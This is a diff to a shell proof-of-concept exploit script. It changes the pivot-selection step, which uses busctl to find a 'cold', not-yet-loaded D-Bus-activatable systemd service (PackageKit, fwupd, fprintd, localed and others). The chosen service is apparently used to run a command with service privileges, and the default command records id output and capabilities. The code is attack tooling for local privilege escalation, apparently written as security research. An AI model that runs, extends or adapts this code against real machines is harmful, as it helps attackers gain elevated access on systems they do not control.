@@ -28,20 +28,30 @@ UNIT="${UNIT_PATH}/linnemanlabs-poc-${RUN_ID}.service"
 SD="org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager"
 DEFAULT_CMD='{ id; grep ^Cap /proc/self/status; } > /tmp/service.out-'"${RUN_ID}"
 CMD=${CMD:-$DEFAULT_CMD}
-# confirm pivot service is cold before proceeding
+
+# confirm pivot service exists on this machine
+is_real(){ busctl call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus ListActivatableNames 2>/dev/null | grep -q "\"$1\""; }
+# confirm pivot service is cold this machine
 is_cold(){ busctl call $SD GetUnit s "$1" 2>&1 | grep -q 'not loaded'; }
 
-# services to pivot through - (dbus-name, unit) pairs come from cold-activatable-pivots.sh, baking a few in:
-for pair in "org.freedesktop.Passim passim.service" \
-            "org.freedesktop.portable1 dbus-org.freedesktop.portable1.service" \
-            "org.freedesktop.sysupdate1 dbus-org.freedesktop.sysupdate1.service" \
-            "org.freedesktop.thermald dbus-org.freedesktop.thermald.service" \
-            "org.freedesktop.intel_lpmd org.freedesktop.intel_lpmd.service" \
-            "org.freedesktop.PackageKit packagekit.service" \
-            "org.freedesktop.realmd realmd.service"; do
+PIVOT_NAME= PIVOT_UNIT=
+for pair in \
+  "org.freedesktop.locale1        systemd-localed.service" \
+  "org.freedesktop.PackageKit     packagekit.service" \
+  "org.freedesktop.Passim         passim.service" \
+  "org.freedesktop.realmd         realmd.service" \
+  "org.freedesktop.fwupd          fwupd.service" \
+  "org.freedesktop.bolt           bolt.service" \
+  "org.freedesktop.GeoClue2       geoclue.service" \
+  "org.freedesktop.ModemManager1  ModemManager.service" \
+  "org.freedesktop.colord         colord.service" \
+  "net.reactivated.Fprint         fprintd.service" \
+  "org.freedesktop.timedate1      systemd-timedated.service" \
+  ; do
   set -- $pair
-  if is_cold "$2"; then PIVOT_NAME="$1"; PIVOT_UNIT="$2"; break; fi
+  if is_real "$1" && is_cold "$2"; then PIVOT_NAME="$1"; PIVOT_UNIT="$2"; break; fi
 done
+
 if [ -z "${PIVOT_UNIT:-}" ];then
   echo "[-] no cold pivot found in base list. run cold-activatable-pivots.sh and add some new ones"
   exit 1
